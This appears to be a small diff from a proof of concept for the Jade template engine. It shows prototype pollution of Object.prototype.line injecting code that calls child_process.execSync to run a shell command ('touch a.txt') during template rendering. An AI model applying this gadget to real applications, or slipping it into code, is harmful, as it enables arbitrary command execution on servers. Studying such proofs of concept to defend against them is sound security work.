@@ -7,4 +7,5 @@ const templatePath = path.join(__dirname+'/views/', 'index.jade');
 Object.prototype.self = 1;
 Object.prototype.line = "console.log(global.process.mainModule.require('child_process').execSync('touch a.txt'))"
 
+
 jade.renderFile(templatePath);
